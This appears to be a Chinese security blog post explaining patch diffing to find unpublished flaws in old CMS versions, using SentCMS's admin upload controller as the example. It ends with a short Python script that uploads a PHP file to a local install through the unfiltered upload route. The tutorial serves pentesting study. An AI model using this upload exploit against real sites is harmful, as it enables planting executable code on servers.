---
title: 寻找历史漏洞
date: 2018-05-22 09:24:36
tags:
	web安全
categories:
  - 网络安全	
---

## 前言
对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。
但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞


### 如何开始
我们以`SentCMS`为例子 我们可以在码云下载到 [下载地址](https://gitee.com/sentcms/sentcms)  或者使用
`git clone https://gitee.com/sentcms/sentcms`
码云作为中国的github 自然是很方便。
但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理
因为git的版本管理和提交对比非常实用 也方便保存进度

大致的git操作是
~~~
git init  #初始化git仓库
git add * #将旧版本全部文件添加
git commit  # 作为初始提交
# 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作
# git status 可能你会想要查看一下文件差异
git add * # 将全部文件改变添加
git commit # 提交更改
# git log 查看日志
# git diff  查看差异

~~~


### 找到漏洞版本
一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞  但是这个cms没有发行版
 如果没有这种信息只能一个提交一个提交的去对比了
 可以使用web查看  [地址](https://gitee.com/sentcms/sentcms/commits/master)

你也可以使用
~~~
git log
~~~

我们可以找到一条看起来可能是修复漏洞的提交
![](https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png)


### 比较差异
可以在命令行使用`git diff` 来查看 也可以选择直接在web界面查看每个提交 [web提交地址](https://gitee.com/sentcms/sentcms/commits/master)

如果不是git 在linux可以使用`diff`命令
~~~
diff -r dir1 dir2
~~~
也可以选择使用一些你喜欢的文件对比工具


### 最重要的一步 查看代码

提交行数不多 快速查看 发现疑似漏洞点
![](https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png)
可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 [地址](https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/common/controller/Upload.php)

 这个时候阅读一下readme 可以看到
~~~
│ ├─common             COMMON公共模型，不可访问
│ │ ├─controller      公共基类目录
│ │ ├─model           模型目录
│ │ ├─validate        验证配置
│ │ ├─view            公共模板目录
│ │ ├─widget          扩展组件目录
~~~
很明显我们不能直接访问 需要通过调用
这个时候Ide就能帮助我们快速找到调用

我们在ide搜索可以找到` application/admin/controller/Upload.php` 没有进行任何过滤的调用了
~~~
namespace app\admin\controller;
use app\common\controller\Admin;

class Upload extends Admin {

	public function _empty() {
		$controller = controller('common/Upload');
		$action     = $this->request->action();
		return $controller->$action();
	}
}
~~~
[web地址](https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/admin/controller/Upload.php)

这个cms使用了tp5框架 需要通过路由访问
我们访问
~~~
http://127.0.0.1/sentcms/admin/Upload/Upload
~~~
从报错信息可以看到已经执行到了漏洞语句位置
由代码可知 直接上传文件即可

### python编写exp
~~~
import requests
url = 'http://127.0.0.1/sentcms/admin/Upload/Upload'
files = {'phpinfo.php': open('phpinfo.txt','rb')}
# 我本地cookeie
cookie = {' remember_token':'1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484','PHPSESSID':'d4ubb72j0d9evlbktqqqct6ci2;'}

r = requests.post(url, files=file，cookies=cookie)
~~~
我们可以在`uploads\picture\20180521`找到一个，以微秒时间的md5编码为文件名的php文件
